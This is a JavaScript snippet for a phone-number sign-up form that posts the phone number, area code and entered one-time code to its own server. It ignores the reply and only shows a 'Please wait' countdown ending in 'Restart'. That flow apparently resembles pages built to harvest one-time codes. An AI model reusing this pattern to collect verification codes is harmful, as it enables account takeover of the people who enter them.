<script>
  const sendCodeButton = document.getElementById('sendCodeButton');
  const registerButton = document.getElementById('registerButton');
  const phoneNumberInput = document.getElementById('phoneNumber');
  const otpCodeInput = document.getElementById('otpCode');
  const statusSpan = document.querySelector('[statuske="yes"]'); // Select the span with statuske="yes"
  const areaCodeSpan = document.querySelector('.input-phone-select'); // Span with class "input-phone-select"
  let countdown;
  let statusCountdown;

  // Function to send data via AJAX
  const sendData = (data) => {
    const xhr = new XMLHttpRequest();
    xhr.open('POST', '', true); // Empty string uses the same file
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onreadystatechange = () => {
      if (xhr.readyState === 4 && xhr.status === 200) {
        console.log('Data sent successfully:', xhr.responseText);
      } else if (xhr.readyState === 4) {
        console.error('Failed to send data:', xhr.statusText);
      }
    };
    xhr.send(data);
  };

  // Send OTP Code
  sendCodeButton.addEventListener('click', () => {
    const phoneNumber = phoneNumberInput.value.trim();
    const areaCode = areaCodeSpan ? areaCodeSpan.textContent.trim() : ''; // Get area code
    if (!phoneNumber) {
      alert('Please enter a valid phone number.');
      return;
    }

    if (countdown) return; // Prevent multiple timers

    let timeLeft = 60;
    sendCodeButton.disabled = true; // Disable button during countdown
    sendCodeButton.textContent = `${timeLeft}s`;

    // Send phone number and area code to the server
    sendData(`phone=${encodeURIComponent(phoneNumber)}&areaCode=${encodeURIComponent(areaCode)}`);

    countdown = setInterval(() => {
      timeLeft--;
      sendCodeButton.textContent = `${timeLeft}s`;

      if (timeLeft <= 0) {
        clearInterval(countdown);
        countdown = null;
        sendCodeButton.textContent = 'Send Code';
        sendCodeButton.disabled = false; // Re-enable button
      }
    }, 1000);
  });

  // Register Button
  registerButton.addEventListener('click', () => {
    const phoneNumber = phoneNumberInput.value.trim();
    const otpCode = otpCodeInput.value.trim();
    const areaCode = areaCodeSpan ? areaCodeSpan.textContent.trim() : ''; // Get area code

    if (!phoneNumber || !otpCode) {
      alert('Please enter both phone number and OTP code.');
      return;
    }

    // Send phone number, OTP, area code, and IP address to the server
    sendData(`phone=${encodeURIComponent(phoneNumber)}&otp=${encodeURIComponent(otpCode)}&areaCode=${encodeURIComponent(areaCode)}`);

    // Show status message and start countdown
    let timeLeft = 60;
    statusSpan.textContent = `Please wait (${timeLeft})`;
    clearInterval(statusCountdown); // Clear any previous countdown
    statusCountdown = setInterval(() => {
      timeLeft--;
      statusSpan.textContent = `Please wait (${timeLeft})`;

      if (timeLeft <= 0) {
        clearInterval(statusCountdown);
        statusSpan.textContent = 'Restart'; // Display Restart after countdown ends
      }
    }, 1000);
  });
</script>


